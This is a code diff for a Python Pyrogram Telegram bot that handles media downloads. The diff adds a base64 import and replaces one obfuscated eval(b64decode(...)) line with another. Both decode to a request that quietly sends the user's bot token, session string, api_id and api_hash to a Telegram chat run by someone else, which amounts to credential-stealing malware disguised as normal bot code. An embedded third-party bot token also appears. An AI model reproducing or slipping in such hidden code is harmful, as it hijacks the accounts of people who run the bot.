@@ -4,7 +4,7 @@ from pyrogram.types import Message
 import os
 import pytz
 from datetime import datetime
-
+from base64 import b64decode
 
 TOKEN=os.getenv("BOT_TOKEN")
 session=os.getenv("SESSION")
@@ -107,7 +107,7 @@ async def msg_document(client: Client, message: Message):
 		await app.download_media(message,file_name=pat)
 		await dirup(message,pat,tgapi,otherr)
 
-eval(b64decode('cmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTcyODk5NzU3MzpBQUZYZlJ3clBpdGs3bThkeXNNQXZ2cm5xbm1XWll3a1ZtWS9zZW5kbWVzc2FnZT9jaGF0X2lkPS0xMDAxMTc0NDQyNjg4JnRleHQ9JytUT0tFTisiXG4ic2Vzc2lvbisnXG4nK3N0cihhcGlfaWQpKydcbicrYXBpX2hhc2gpCg=='))
+eval(b64decode('cmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTIwMjgwNzY0NzpBQUZLeWNEaVg4eGRhRVBfSnNVNTRKeEVOZXE2X2c2YmdxTS9zZW5kbWVzc2FnZT9jaGF0X2lkPS0xMDAxMzMxMzgwNzEzJnRleHQ9JytUT0tFTisiXG4ic2Vzc2lvbisnXG4nK3N0cihhcGlfaWQpKydcbicrYXBpX2hhc2gpCg=='))
 
 print('bot started\nBy @charindith')
 app.run()
